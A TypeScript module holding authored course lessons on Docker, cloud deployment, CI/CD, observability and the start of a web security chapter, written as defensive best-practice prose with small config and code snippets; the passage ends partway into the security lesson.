import type { TopicLesson } from "../topicLessons.js"; /** * Production Engineering — 9 authored topic lessons. * * Standalone chapters per topic. Subject-first prose, foundations, core * concepts, worked examples, exam practice, cheat sheet, recap. No shared * templates, no runtime composition. */
export const productionEngineering: Record<string, TopicLesson> = {
  "web-dev-production-engineering-docker-and-containers": {
    intro: `Docker turns your application and everything it needs — runtime, libraries, config — into a portable image that runs identically on a laptop, CI, and production; containers are the unit of deployment in modern systems. The subject is the image model, layers, Dockerfiles done right (multi-stage, non-root, cached layers), Compose for local stacks, and the security basics that keep supply chains honest. a container is a process on the host with a sealed filesystem view — not a virtual machine, not a toy.`,
    foundations: `Images are layered read-only filesystems (union mounts); each Dockerfile instruction creates a layer; layers cached by content hash make rebuilds fast (order matters: least-changing first — base, deps, then source). Containers = runtime instances of images sharing host kernel with isolation (namespaces: pid, net, mount, uts; cgroups: cpu/memory limits). Dockerfile essentials: FROM (pin digests/tags), WORKDIR, COPY (context, .dockerignore), RUN (cache-friendly), ENV, EXPOSE (documentation), USER (never root in prod), CMD/ENTRYPOINT. Compose wires multi-service local stacks (API + DB + cache) with volumes and networks. Security: scan images (trivy), minimal base images (distroless/alpine + caution), no secrets in layers, signed images (cosign) in supply chains.`,
    concepts: [
      {
        title: "Image layers and build cache discipline.",
        body: `COPY package*.json first + npm ci, then COPY. . — source changes rewrap one layer, dependency layer cached; doing it backwards re-installs deps on every code edit. .dockerignore excludes node_modules, .git, tests, .env — smaller context, faster, leak-free (a .env in the context can bake secrets into a layer forever — layers are immutable and push with the image). Pin base versions (node:20.11.1-alpine or by digest @sha256:) — latest is a lottery; lockfiles inside images; multi-stage builds: install/build stage carries dev deps and toolchain, final stage copies artifacts only — final image often 80% smaller and without compilers.`,
      },
      {
        title: "Multi-stage builds and minimal runtime images.",
        body: `Pattern: FROM node:20 AS build → npm ci, npm run build → FROM node:20-alpine or gcr.io/distroless/nodejs20-debian12 AS runtime → COPY --from=build /app/dist ./dist, COPY package*.json, npm ci --omit=dev, USER node (or nonroot), CMD ["node", "dist/server.js"]. Distroless carries no shell/package manager — tiny attack surface, no debug affordances (shell access impossible — which is the point); alpine trades tiny size for musl libc quirks (rare, but sharp). Verify: docker history shows no toolchain; dive tool audits layers; scan final image in CI; fail on critical CVEs.`,
      },
      {
        title: "Networking, ports, volumes, and environment.",
        body: `Containers get private IPs on bridge networks; Compose services reach each other by name (api reaches postgres:5432); port mapping -p 8080:3000 exposes host port to container; only what must be public is published. Volumes: named volumes persist DB data across recreation; bind mounts mount source for dev hot-reload (never in prod). Environment: ENV in Dockerfile for defaults; .env files for Compose; real secrets via runtime injection (K8s secrets, secret managers) — environment is part of the image contract; never commit real credentials; the same image must run unchanged in every environment (config from env only).`,
      },
      {
        title: "Compose for the full local stack.",
        body: `docker-compose.yml: services db (postgres:16, named volume, healthcheck), redis (redis:7), api (build:., ports, env_file, depends_on condition: service_healthy), web (build, ports). Up: docker compose up --build; one command stands up the system; teammates onboard in minutes. Healthchecks + depends_on ordering prevent race-y startup failures; named volumes keep state; profiles split services (tools vs core). Compose is dev/CI orchestration, not prod — prod is orchestrators (Kubernetes) or platforms (Render, Fly) with the same images; keep Dockerfiles prod-shaped so moving up costs nothing.`,
      },
      {
        title: "Image security and supply chain.",
        body: `Never run as root; drop capabilities (--cap-drop ALL + add only needed); read-only root filesystem (--read-only) with tmpfs for writable scratch; no setuid binaries; pin by digest; scan in CI (trivy image --severity CRITICAL,HIGH --exit-code 1); minimal images; signed images + policy admission (cosign verify in deploy) for serious orgs; SBOM generation (syft) for audit; update base images on schedule (renovate bot for Dockerfile FROM tags) — stale bases accumulate CVEs silently; third-party images from verified publishers only; prefer official/verified badges.`,
      },
    ],
    worked: [
      {
        title: "Shrink a 1.2 GB image to 180 MB.",
        body: `Audit: FROM node:latest (unpinned), COPY. ., npm install (includes dev), runs as root, .env baked in. Rewrite: FROM node:20.11-alpine AS build with npm ci + build; runtime stage distroless copy dist + prod node_modules (npm ci --omit=dev); USER nonroot; .dockerignore with node_modules/.env/.git; result 168 MB, no shell, no secrets in history, rebuild-cached layers; CI scans: zero criticals; deploy rolls instantly.`,
      },
      {
        title: "One-command local stack with healthchecks.",
        body: `compose: postgres with healthcheck pg_isready; redis ping; api depends_on both healthy; env from .env.example (no secrets); Makefile make dev = compose up --build; new engineer: clone → cp .env.example .env → make dev → stack live in 60 s; CI uses the same compose for service tests (integration suite runs against real PG/Redis, not mocks); the same images deploy to prod — parity between laptop and cloud.`,
      },
      {
        title: "Debug a container that dies on start.",
        body: `Symptom: exit code 1, no logs. docker ps -a shows status; docker logs <id> empty; docker run -it --entrypoint sh image → binary missing? musl vs glibc (panic: libc mismatch on alpine with glibc-built wheel) → rebuild with correct base or install stdlib compat; or ENV var typo (crash on boot reading config) → fail fast with clear error message; fix: entrypoint validates env with zod and prints missing keys before starting — dead containers now explain themselves; monitoring restarts counter.`,
      },
    ],
    exam: [
      {
        question:
          "Why does COPY package.json before the application source improve builds?",
        answer:
          "Docker layer caching keys on content — the dependency install layer only rebuilds when package*.json changes; copying source after preserves the expensive npm ci cache across code edits; reversed order re-installs dependencies on every source change.",
      },
      {
        question: "What does a multi-stage Dockerfile achieve?",
        answer:
          "Build-time dependencies, toolchains, and secrets-adjacent tooling never reach the runtime image; artifacts (dist, prod node_modules) copy into a minimal clean base — smaller, faster to push, and drastically reduced attack surface (no compiler or shell inside).",
      },
      {
        question: "Why must production containers not run as root?",
        answer:
          "A container breakout or vulnerable app then drops into a root-owned process on the host namespaces; non-root users (node/nonroot/uid 1000) limit blast radius to that user — file access, process signalling, and capability use all shrink dramatically.",
      },
      {
        question:
          "What belongs in .dockerignore and why does it matter for secrets?",
        answer:
          "node_modules, .git, .env*, build outputs, test fixtures, local overrides; a .env copied into the context can land in a layer pushed to a registry — layers are immutable, so the secret persists in the image history forever and everyone with pull access reads it.",
      },
    ],
    cheat: [
      "Layers cache by content; least-changing first; .dockerignore everything inert.",
      "Pin base by version or digest; never latest.",
      "Multi-stage: toolchain out, artifacts in; distroless/alpine runtime; USER nonroot.",
      "Healthchecks + depends_on for Compose ordering; named volumes persist DB.",
      "Env for config, runtime secrets via platform; never in layers.",
      "Scan (trivy) in CI; fail on criticals; renovate FROM tags.",
      "Prod runs read-only fs, caps dropped, smallest image that works.",
    ],
    recap: `Containers are sealed processes: images are layered filesystems where order decides cache hits; Dockerfiles pin, layer cheaply, build multi-stage, run non-root, and scan clean; Compose assembles the local world honestly and CI reuses it for real integration tests; and the same prod-shaped image runs unchanged from laptop to registry to production — portability is the whole point, and discipline is how you keep it secure.`,
    code: {
      title: "Multi-stage Node image",
      language: "dockerfile",
      code: `FROM node:20-alpine AS build\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY. .\nRUN npm run build\nFROM gcr.io/distroless/nodejs20-debian12\nCOPY --from=build /app/dist ./dist\nCOPY --from=build /app/node_modules ./node_modules\nCMD ["dist/server.js"]`,
      explanation:
        "Build stage installs dev deps and compiles; runtime stage copies only artifacts and production node_modules; distroless has no shell; the image is small, pinned, and runs unprivileged by default config elsewhere.",
    },
    diagram: {
      title: "Multi-stage build",
      caption: "Toolchain in the build stage; artifacts in the runtime stage.",
      mermaid: `flowchart LR\n B[Build stage: toolchain + tests] --> A[Artifacts]\n A --> R[Runtime stage: minimal image]`,
    },
  },
  "web-dev-production-engineering-cloud-deployment": {
    intro: `Cloud deployment is the craft of running your app somewhere it is reachable, observable, and survivable — from push-button platforms (Vercel, Render, Fly) to cloud primitives (AWS). The subject is choosing the right host for your shape, managing environments, secrets, domains, and managed databases, and surviving deploys with zero drama. deployment is where engineering meets pagers — pick boring, predictable, managed infrastructure and change it slowly.`,
    foundations: `Option space: managed PaaS (Render, Fly.io, Railway — git-push deploys, TLS, autoscaling) for most apps; Vercel for frontend/Next; serverless (AWS Lambda, Cloudflare Workers) for spiky workloads and event triggers (watch cold starts + limits); VMs (EC2) and Kubernetes for complex multi-service estates (high operational cost). Environments: production, staging (prod-like), preview per PR (ephemeral, realistic, disposable). Managed databases beat self-hosted (backups, PITR, HA by default). Domains: DNS providers, TLS certs (auto via Let's Encrypt/ACM or platform), HSTS. Secrets: platform env vars or secret managers. Deploy health: rolling with health checks; blue/green; canaries.`,
    concepts: [
      {
        title: "Choosing the platform honestly.",
        body: `Vercel: frontends and Next.js — best DX, previews, edge network, generous free tier; backend services supported but tuned for short-lived requests. Render/Fly/Railway: full-stack web + workers + cron + managed Postgres — one config file, predictable pricing, no K8s PhD required. AWS/GCP: maximal control — VPC, IAM, RDS, ECS/EKS; pays off in compliance-heavy or scale-critical orgs; costs a platform team. Default heuristic: PaaS until it hurts, then AWS primitives for the parts that hurt. Container anywhere: keep images portable so migrations between hosts are cheap.`,
      },
      {
        title: "Environments and preview deployments.",
        body: `prod = users; staging = prod-shape for final verification (or shadow traffic); preview = per PR, ephemeral, with realistic data shape (seeded/anonymized), linked from the PR — reviewers click instead of checking out branches. Environment parity: same image, same config keys, only values differ; staging databases are copies/restores, never shared prod tables; feature flags gate risky changes independent of deploy; rollback = redeploy previous artifact (CI/CD keeps artifacts) — deployment should be a non-event.`,
      },
      {
        title: "Databases, backups, and networking.",
        body: `Managed Postgres with PITR (point-in-time recovery) — restores to any minute, automatic backups verified by restore drills, connection pooling (PgBouncer) for serverless spikes, read replicas for analytics offload, private networking (no public DB ports — platform internal network or VPC, access via bastion/proxy). Redis managed or self-run on private network; object storage (S3/R2/B2) for files/static; CDN in front of everything cacheable; DNS apex/subdomain setup, wildcard certificates; WAF rules for common OWASP patterns at the edge.`,
      },
      {
        title: "Secrets, IAM, and access control.",
        body: `Secrets live in the platform or a manager (Doppler, AWS Secrets Manager, Vault) — never git, never Dockerfiles, never client bundles. Least privilege: service roles get only their bucket/table; human access via SSO + short-lived sessions; break-glass documented; .env local-only with .env.example committed; audit logs on secret access; rotation schedules for keys (quarterly) and immediate rotation on leak suspicion; provider tokens for CI scoped narrowly with short TTLs.`,
      },
      {
        title: "Deploy safely: rollbacks and migrations.",
        body: `Release pipeline: build artifact → staging deploy → smoke tests → production rollout with health gates → auto-rollback on error budget burn (or one-click). Database changes expand-contract before code; deploy of code must tolerate previous schema. Feature flags let ship-dark-then-enable; keep deploys small (fuse PRs); watch dashboards 15 minutes post-release; the drill: intentionally roll back once per quarter so it is muscle, not theater.`,
      },
    ],
    worked: [
      {
        title: "Vercel + Neon for a full-stack app in an afternoon.",
        body: `Import repo in Vercel (Next.js detected); Neon Postgres via integration — DATABASE_URL injected automatically; drizzle-kit push for schema; previews per PR with isolated branches and seeded data; custom domain added with one click + auto TLS; ISR + edge caching defaults; analytics free; rollback via one click; cost at seed: $0; the entire pipeline PR→preview→merge→prod is ~4 minutes; zero servers administered by you; that is the modern default most apps never need beyond.`,
      },
      {
        title:
          "Move a Rails-ish API from Heroku-era to Render with minimal risk.",
        body: `Lift container as-is (Render deploys Docker); managed Postgres with PITR enabled from day one; env parity checklist (47 vars diffed staging vs prod — 6 missing because staging drifted, found pre-incident by checklist); cutover: lower TTL on DNS to 60 s, blue-green by scaling new service with health checks, switch traffic, keep old for 7 days then decommission; incident risk measured: zero downtime; rollback story: DNS flip back; total engineering time: 2 days incl. runbooks.`,
      },
      {
        title: "Design preview environments for a 30-person team.",
        body: `Every PR gets a preview URL + branch DB (neon branch or compose-on-runner seeded); anonymized data seed script; PR bot comments the URL with build status; reviewers QA flows via link incl. mobile; teardown on merge; cost: pennies per preview; bugs caught pre-merge tripled; staging becomes less critical — kept for load tests and migration rehearsals; on-call joy restored because releases are boring again.`,
      },
    ],
    exam: [
      {
        question:
          "Why are preview deployments a force multiplier for small teams?",
        answer:
          'Every change becomes clickable reality instantly — reviewers, PMs and designers verify in a production-like URL without local setup; integration issues surface before merge, review cycles shrink, and "works on my machine" disappears as a category; the marginal cost is near zero on modern platforms.',
      },
      {
        question: "What must change before DNS cutover to a new host?",
        answer:
          "Lower TTL well in advance (60 s or less), complete env/config parity audit staging↔prod, run the full smoke suite against the new stack via hosts-file or direct URL, freeze schema changes, and keep the old environment warm — cutover then is a minutes-long reversible flip.",
      },
      {
        question: "Why does least-privilege IAM matter for CI deploy tokens?",
        answer:
          "A CI token with broad rights leaked from logs or a compromised runner hands the attacker the whole estate — deploy, data, secrets; narrow tokens (deploy-only to one project, TTL-boxed, no secret reads) cut one stolen credential down to a scoped, expiring incident.",
      },
      {
        question: "When is serverless the wrong choice for a web API?",
        answer:
          "For long-running or connection-heavy workloads (WebSockets, big in-memory state, heavy CPU with 15-minute limits, low-latency steady-state traffic where cold starts and per-invocation billing cost more than a fleet of containers); steady predictable load usually favors always-on PaaS boxes.",
      },
    ],
    cheat: [
      "PaaS first; AWS primitives where it hurts; keep images portable.",
      "Envs: prod/staging/preview; parity by config, not by drift; previews per PR.",
      "Managed Postgres + PITR; pooling; private networking; no public DB ports.",
      "Secrets in platform/manager; .env.example only; rotate on suspicion.",
      "Deploy = rolling + health gates; rollback = previous artifact; flags decouple.",
      "Backups proven by restores; staging rehearsals for migrations; DNS TTL trick.",
      "HTTPS + HSTS everywhere; CDN in front of cacheables.",
    ],
    recap: `Deployment done well is uneventful: choose managed PaaS by default (Vercel/Render/Fly) and AWS primitives only where measured need demands; environments are config-parity, not snowflakes; previews make every PR real; databases are managed with PITR and restores rehearsed; secrets live in managers with narrow tokens; migrations precede code; and rollback is redeploying yesterday's artifact — boring, rehearsed, instant.`,
    code: {
      title: "Render service blueprint sketch",
      language: "yaml",
      code: `services:\n  - type: web\n    name: api\n    runtime: docker\n    healthCheckPath: /health\n    envVars:\n      - key: DATABASE_URL\n        fromDatabase: { name: db, property: connectionString }`,
      explanation:
        "Infra-as-config for the service: health gate drives zero-downtime deploys; database connection string sourced from the managed instance — no manual secret copying, restart-safe.",
    },
    diagram: {
      title: "PR-to-production pipeline",
      caption: "Preview per PR, gate, deploy.",
      mermaid: `flowchart LR\n PR[Pull request] --> PV[Preview URL]\n PV --> M[Merge]\n M --> P[Production rolling deploy]`,
    },
  },
  "web-dev-production-engineering-ci-cd-and-release-engineering": {
    intro: `CI/CD is the conveyor built between your laptop and production: CI proves every change compiles, lints, tests, and passes checks; CD ships the proven artifact through staging to production with gates, rollbacks, and traceability. The subject is the pipeline that makes releases boring — GitHub Actions patterns, preview environments, migration orchestration, and the discipline of small, frequent, reversible releases. a release is a production change with an audience, and it deserves procedure, not bravery.`,
    foundations: `CI: on push/PR — checkout, setup toolchain (Node with cache), install (npm ci), lint (eslint), typecheck (tsc --noEmit), unit tests, integration tests (services via containers), build, artifact archive. CD: on merge — deploy staging, smoke tests, then production with health gates; rollbacks redeploy previous artifact. Patterns: trunk-based development (short-lived branches, merge to main, deploy from main), feature flags, canary/rolling deploys, blue-green, release trains. Quality gates: coverage thresholds (soft), audit (npm audit), secrets scanning (gitleaks), license check, bundle-size budget, preview URL on every PR.`,
    concepts: [
      {
        title: "The CI pipeline that pays for itself.",
        body: `Every push: install with cache → lint → typecheck → test (unit, integration with service containers) → build → upload artifact. Parallelize independent jobs; cache aggressively (node_modules keyed on lockfile hash, build outputs); fail fast — lint before tests; job timings logged; queue time tracked; branch protection requires green CI; flaky tests are quarantined and fixed, never re-run-and-pray as policy; weekly CI health review (duration, flakiness rate, cost). Speed budget: <10 min full CI for a web app — beyond that people stop waiting and merge blind.`,
      },
      {
        title: "GitHub Actions job anatomy.",
        body: `workflow on: pull_request and push to main; jobs: build-test (steps: checkout@v4, setup-node@v4 with cache: npm, npm ci, npm run lint, npm run typecheck, npm test, npm run build); integration (services: postgres+redis containers, run migrations, npm run test:integration); e2e (playwright with sharding); deploy (needs: [build-test, integration], if: main, environment: production with required reviewers — the GitHub environment protection rule is your human gate). Secrets: GITHUB_TOKEN default scope-minimal; custom tokens scoped narrowly. Concurrency group per ref cancels stale runs. Workflow files in git — reviewed like code; reusable composite actions for repeated logic.`,
      },
      {
        title: "Release strategies: rolling, blue-green, canary.",
        body: `Rolling: replace instances gradually behindLB with health checks — simplest, slow rollback-ish (redeploy old artifact). Blue-green: two full environments; deploy to idle (green), smoke-test, switch router 100%, old stays warm — instant rollback (switch back), costs 2x infra briefly. Canary: route 1-5% of traffic to new version, watch error rate/latency vs baseline, auto-promote or auto-rollback on thresholds — best risk containment; needs traffic splitting (mesh, LB, or platform support). Choose per risk profile; all demand idempotent deploys and artifacts built once, promoted everywhere — never rebuilt per environment.`,
      },
      {
        title: "Migrations and feature flags in releases.",
        body: `Expand-contract migrations ship before code in a separate job (pre-deploy step): safe because compatible; code ships, dual-writes activate; contract step later. Feature flags decouple deploy from release: code merges dark, enables per environment/user cohort/percentage; kill switch on incident; flag debt tracked (expire flags within N releases; stale flags = tangled code and stale configs). Combine: canary + flag lets you halt exposure instantly without rollback if only a cohort is affected.`,
      },
      {
        title: "Rollbacks and release observability.",
        body: `Every release must be reversible: artifacts tagged with SHA, previous artifact one command away; automated rollback triggers: elevated 5xx, latency regression, health check failures, error budget burn — wired to alert routing. Post-release: watch dashboards 15-30 min; annotate graphs with deploy markers; verify SLOs unaffected; communicate in channel (release bot posts + outcome after 30 min). Postmortem any wave that went sideways; the pipeline is a product too — iterate on it like one.`,
      },
    ],
    worked: [
      {
        title: "Design a 10-minute GitHub Actions pipeline.",
        body: `PR triggers lint + typecheck (2 min) and unit tests (4 min) in parallel; integration job with postgres:16 service runs after lint (4 min): migrate, seed, run API tests; build (3 min) uploads artifact; total wall ~6-7 min; caching by lockfile; concurrency cancels superseded runs; main branch adds deploy-staging job with smoke suite; main merge queue runs full e2e (Playwright shards) before prod deploy with one-approval environment gate; artifacts immutable and promoted; every PR green before merge — enforced by branch protection; nightly scheduled job audits dependencies.`,
      },
      {
        title: "Ship a risky pricing change behind a canary + flag.",
        body: `Merge with flag pricing_v2=off; deploy to prod; enable for internal users; enable 2% canary flag cohort (hash user_id) alongside 1% traffic canary; error rate parity and checkout conversion watched 48 h; anomaly spotted in 2% cohort (rounding bug on EU VAT) — kill flag, zero user-visible incident; fix; re-canary 5% → 25% → 100% over a week; rollback path never used but rehearsed; the flag is deleted within two releases (flag hygiene task on the board).`,
      },
      {
        title: "Roll back a bad deploy in under five minutes.",
        body: `Spike in 5xx after 14:02 deploy. Alert fires; on-call reverts: workflow dispatch release-rollback with target_sha=previous; artifact redeployed; LB drains; error rate normal by 14:07; RCA: config value malformed for one region — caught by canary next time (now added) and added a config-schema CI check; incident communication posted; no user-facing data loss; Monday review adds the alert-to-revert automation gap to the backlog.`,
      },
    ],
    exam: [
      {
        question:
          "Why must the same artifact be promoted through environments instead of rebuilt?",
        answer:
          "Rebuilding per environment proves nothing about the build that will actually run in production — nondeterminism (deps, timestamps, compilers) silently ships different bits; artifact-once-promote-everywhere is the only way staging evidence transfers to prod.",
      },
      {
        question: "What does a GitHub environment protection rule give you?",
        answer:
          "A human gate before production: required reviewers, wait timers, or branch restrictions on the deploy job — automation runs everything up to prod, but the final promotion is explicit, auditable and reversible, turning releases into controlled decisions.",
      },
      {
        question:
          "What is the purpose of feature flags in release engineering?",
        answer:
          "They decouple merging/deploying code from exposing behavior — code ships dark, activates per cohort/percentage on demand, doubles as an instant kill switch, and lets you separate deploy risk from business risk; without them every deploy is an exposure event.",
      },
      {
        question:
          "Why treat flaky tests as quarantined debt, never as retry-until-green?",
        answer:
          "Retrying masks real product bugs and trains teams to ignore red CI — once CI cries wolf, signal is lost; quarantining the flake, tracking it, and fixing it (or deleting it) restores the invariant that green means safe to ship, which is the entire point of CI.",
      },
    ],
    cheat: [
      "CI: install → lint → typecheck → test → build; parallel, cached, <10 min.",
      "Artifacts built once, promoted everywhere; never rebuild per env.",
      "Trunk-based + feature flags; small merges; deploy from main.",
      "Migrations expand-contract in pre-deploy jobs; code after, contract last.",
      "Rolling / blue-green / canary per risk; health gates and auto-rollback.",
      "Environment gate = required human review for prod deploys.",
      "Release annotations on dashboards; rollback = previous artifact command.",
    ],
    recap: `Release engineering makes shipping a non-event: CI proves every change via lint, typecheck, tests and builds — fast, parallel, cached; artifacts are built once and promoted; migrations expand-contract before code; canaries, flags and health gates contain risk; environment approvals gate human decisions; rollback redeploys yesterday's artifact; and flakiness is fixed — because a pipeline you trust lets you ship twelve times a day without a war room.`,
    code: {
      title: "Minimal GitHub Actions CI job",
      language: "yaml",
      code: `jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: 20, cache: npm }\n      - run: npm ci && npm run lint && npm test && npm run build`,
      explanation:
        "Cache keyed on lockfile makes installs seconds; lint gates tests; build proves the artifact compiles; the same shape scales to integration/e2e jobs with service containers.",
    },
    diagram: {
      title: "Pipeline stages",
      caption: "Lint, test, build, gate, deploy.",
      mermaid: `flowchart LR\n L[Lint] --> T[Test]\n T --> B[Build artifact]\n B --> G[Approval gate]\n G --> D[Deploy]`,
    },
  },
  "web-dev-production-engineering-observability-and-reliability": {
    intro: `Observability and reliability are how production tells you the truth: structured logs, metrics, traces, health checks, SLOs, and alerting wired to response — replacing guesswork with evidence during incidents. The subject is the three pillars (logs, metrics, traces) put to work, plus the practices (health probes, golden signals, SLOs/error budgets, runbooks) that keep systems observable and dependable under real traffic. if you cannot see it, you cannot fix it — instrument first, debug with data.`,
    foundations: `Logs: structured JSON with request ids, user-safe fields, redaction; levels, sampling for hot paths; central aggregation (Loki/ELK/Datadog). Metrics: counters (requests), gauges (queue depth), histograms (latency buckets) — Prometheus scrapes or push gateways; golden signals: latency, traffic, errors, saturation. Traces: OpenTelemetry spans across services with context propagation (trace-id headers) — the timeline of a request end to end. Health: liveness (process alive) vs readiness (can serve: dependencies OK, not draining). SLOs: target (99.9% success) measured over 30d rolling window; error budget = allowed failure; alerts on burn rate, not on raw thresholds; runbooks per alert; blameless culture.`,
    concepts: [
      {
        title: "Structured logging that actually gets used.",
        body: `Every line: timestamp UTC, level, service, env, request_id, user_id (pseudonymous ok), route, status, duration_ms, event name, plus business fields (order_id for a payment). JSON to stdout → collector → query by field. Never log secrets/passwords/full card numbers — redact at the logger (pino redact paths). Volume and cost: sample noisy health endpoints, keep 100% of errors; log levels enforced — no info-spam at hot paths; retention tiered (hot 7-14 days, cold cheap archive); the payoff: one query reconstructs any incident story.`,
      },
      {
        title: "Metrics with the golden signals.",
        body: `Define per service: latency histogram (p50/p95/p99 per route), traffic counter (rps per route), error counter (4xx vs 5xx separately — client errors are not service failures), saturation gauge (CPU, memory, queue depth, connection pool usage, event-loop lag). RED method for request-driven services; USE for resources. Prometheus + Grafana (or vendor equivalents) with dashboards per service: RED + infra + business (checkouts/min) on one page. Alerts on burn: error rate 5x budget for 5 min = page; sustained slow burn = ticket.`,
      },
      {
        title: "Distributed tracing end to end.",
        body: `OpenTelemetry: instrument HTTP/GRPC/DB clients once (auto-instrumentation for most Node libs); propagate traceparent header across service boundaries; every span carries service name, operation, attributes (http.route, db.statement truncated, user.id hashed); collect to Tempo/Jaeger/Datadog; view a request waterfall: gateway 40 ms → auth 8 ms → postgres 120 ms (span n+1?!) → redis 3 ms → render 15 ms. Tracing turns "everything feels slow" into "95th percentile dominated by one N+1 and one unindexed query" — the graph problem every argument needs.`,
      },
      {
        title: "Health probes and SLO-driven operations.",
        body: `Liveness probe: is the process stuck/deadlocked? → restart. Readiness: can it serve — DB reachable, not draining, warmed caches → remove from LB. Startup probes for slow boot. SLOs: define per service (availability 99.95%, p95 latency < 400 ms on /api/*); error budget policies: when budget burns fast → freeze risky deploys, amplify reviews; when healthy → normal cadence; monthly review computes SLI achievements; breach → error budget review meeting with action items. SLOs are the social contract between velocity and stability.`,
      },
      {
        title: "Alerting hygiene and incident readiness.",
        body: `Alerts must be actionable: page on SLO burn and user-facing symptoms (5xx rate, latency, queue depth), not on every CPU blip; every page links a runbook (diagnosis steps, mitigation commands, escalation); tune noise ruthlessly — every non-actionable alert erodes response when real; on-call rotation with comp time; game days rehearse failures (kill postgres replica, break DNS, exhaust Redis memory); post-incident review mandatory, blameless, with tracked action items; dashboards per service always current — stale dashboards lie at 3 AM.`,
      },
    ],
    worked: [
      {
        title: "Instrument a Node API in one afternoon.",
        body: `pino-http for request logs with generated-or-propagating request_id; prom-client for RED metrics at /metrics; OpenTelemetry auto-instrumentations for express, pg, redis, http clients; exporter to the vendor (Datadog agent / OTEL collector); dashboard: request rate, p95, errors 5xx, event-loop p99; alert rules: 5xx rate > 2% for 5 min (page), p95 > 800 ms for 10 min, saturation postgres pool > 80%; runbook for the 5xx alert with exact kubectl/q-shuffle commands; rehearsed in staging — team response time to synthetic incident: 6 minutes.`,
      },
      {
        title: "Find the p99 culprit with spans.",
        body: `User complaints: invoice list slow sometimes. Traces show: endpoint span 850 ms total — children: auth 12 ms, postgres invoice query 700 ms (span attributes show Seq Scan, estimated 5 rows actual 40k). Fix: index on (tenant_id, created_at); deploy; traces again: query 8 ms; p99 of the route 900→60 ms; the trace also revealed a missing tenant filter on one path (security fix piggybacked); cost: 30 minutes + one index; zero guesses, all evidence.`,
      },
      {
        title: "SLO budget review rescues the roadmap.",
        body: `99.9% monthly budget = 43 minutes of downtime-equivalent; team burned 60 by release week. Policy invoked: freeze non-critical releases; all hands on reliability debt 2 weeks — connection pool leak fixed, retry storm tamed, alert noise cut 70% — budget recovered next cycle; feature work resumed with cleaner dashboards; the review shifted conversations from "who broke prod" to "how fast is our budget burning" — psychological safety delivered by math.`,
      },
    ],
    exam: [
      {
        question:
          "What is the difference between liveness and readiness probes?",
        answer:
          'Liveness answers "should this process be restarted?" (deadlock, crash loop); readiness answers "may this instance receive traffic now?" (dependencies healthy, not draining, warmed); misusing liveness for dependency checks causes restart storms during downstream outages.',
      },
      {
        question:
          "Why alert on error-budget burn rate rather than raw error counts?",
        answer:
          "Burn rate normalizes alerting to the SLO — it pages when failure threatens the objective fast enough to matter, ignores tiny absolute counts in high-traffic services and tiny traffic services with absolute thresholds entirely, and aligns incentives with reliability, not with twitch.",
      },
      {
        question: "What does a span give you that metrics alone cannot?",
        answer:
          "Causality per request — the ordered waterfall of downstream calls with their durations and attributes; metrics tell you aggregate p99 got worse; traces localize the 700 ms inside one route to a specific query, service or N+1.",
      },
      {
        question:
          "Why is structured JSON logging over console.log a requirement, not a nicety?",
        answer:
          "Queryable fields (request_id, route, status) make any event retrievable in seconds across millions of lines — plain strings need regex heroics, correlate poorly across services, and defeat automated alerting; structure is what makes logs a database you can interrogate during an incident.",
      },
    ],
    cheat: [
      "Golden signals: latency, traffic, errors, saturation per route.",
      "Logs: JSON, request_id, redact secrets, sample noise, keep 100% of errors.",
      "OTel traces: context propagation, spans per hop, waterfall the request.",
      "RED for services, USE for resources; dashboards per service always current.",
      "Liveness = restart; readiness = traffic; startup for slow boots.",
      "SLOs + burn-rate alerts; monthly budget review; error budget gates deploys.",
      "Every page links a runbook; rehearse with game days; blameless reviews.",
    ],
    recap: `Observability is structured evidence: JSON logs with request ids for interrogatable history, RED metrics for the golden signals, OpenTelemetry spans for per-request causality, health probes for safe orchestration, and SLOs with error budgets turning reliability into a measurable contract — with burn-rate alerts and rehearsed runbooks, your next incident is a timed exercise instead of a new mystery.`,
    code: {
      title: "OTel auto-instrumented server",
      language: "javascript",
      code: `import { NodeSDK } from '@opentelemetry/sdk-node';\nconst sdk = new NodeSDK({ instrumentations: [getNodeAutoInstrumentations()] });\nsdk.start();`,
      explanation:
        "Instruments http/express/pg/redis automatically; spans flow to your collector; trace context propagates across hops with zero handler changes — visibility before refactor.",
    },
    diagram: {
      title: "Telemetry flow",
      caption: "Requests become logs, metrics, traces.",
      mermaid: `flowchart LR\n R[Request] --> L[Logs]\n R --> M[Metrics]\n R --> T[Traces]`,
    },
  },
  "web-dev-production-engineering-web-security": {
    intro: `Web security is the OWASP Top Ten turned into engineering practice: input validation, output encoding, authentication protections, security headers, CSP, and supply-chain hygiene — applied uniformly so one weak endpoint stops being the whole story. The subject is the defense-in-depth craft: specific attacks, specific defenses, and the verifications (scans, audits, tests) that prove them present rather than assumed. most breaches are boring mistakes — unvalidated input, unescaped output, forgotten headers — and boring mistakes are preventable by design.`,
    foundations: `Key risks and defenses: XSS (reflected/stored/DOM): escape on output, sanitize rich text, CSP, no innerHTML with user data, HttpOnly for session cookies. Injection: SQL via parameter binding; command injection — never concat; SSTI — escape or sandbox. Broken access control: per-resource authz, tenant scoping, deny by default. Authentication flaws: hashed passwords, rate limits, MFA. Headers: HSTS, CSP (default-src 'self'; nonces for inline), frame-ancestors, nosniff, Referrer-Policy. CSRF: SameSite + tokens. SSRF: outbound allowlists. Supply chain: lockfiles, audits, npm overrides, vetted deps. Secrets: never in code/logs; rotate.`,
    concepts: [
      {
        title: "XSS: output encoding is the law.",
        body: `Every interpolation into HTML must encode by default: React JSX does it natively (dangerouslySetInnerHTML opts out — audit every use, sanitize with DOMPurify first); templates in server frameworks escape by default (verify); APIs return JSON with correct Content-Type + nosniff so browsers never interpret as HTML. Stored XSS needs input-time sanitization too — strip/encode scripts at write; defense in depth: CSP with nonces (script-src 'nonce-abc123') breaks injected scripts even if they exist in the DOM; audit innerHTML, eval, new Function, location.hash flows; test with the XSS cheat sheet payloads in the test suite.`,
      },
      {
        title: "CSP and the header stack.",
